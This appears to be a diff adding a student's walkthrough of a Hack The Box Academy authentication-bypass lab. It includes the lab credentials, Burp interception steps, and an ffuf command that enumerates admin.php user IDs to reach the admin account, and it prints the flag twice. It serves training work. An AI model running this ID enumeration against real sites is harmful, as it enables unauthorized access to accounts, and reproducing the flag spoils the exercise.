@@ -1,1 +1,14 @@
 
+CHALLENGE: Authenticate to 94.237.54.190:41136 with user "htb-stdnt" and password "AcademyStudent!" 
+
+Question 1 -  Apply what you learned in this section to bypass authentication to obtain the flag. - HTB{63593317426484ea6d270c2159335780} 
+1) open burp
+2) go to http://94.237.54.190:41136
+3) enter auth info above and turn burp proxy on to catch the POST request 
+4) inside burp and repeaters hit send and we can see that it now gives up in the response tab a /admin.php?user_id=183
+5) if we edit a new request and use a GET /admin.php?user_id=184 we see on the response tab that "Could not load admin data." 
+6) lets ffuf this out, but first a lil custom seq list
+7) seq 1 1000 > user_ids.txt 
+8) ffuf -w user_ids.txt -u http://94.237.54.190:41136/admin.php?user_id=FUZZ -fr "Could not load admin data."
+9) we get a 200 response on id 372 -> then in firefox go here -> http://94.237.54.190:41136/admin.php?user_id=372
+10) HTB{63593317426484ea6d270c2159335780}
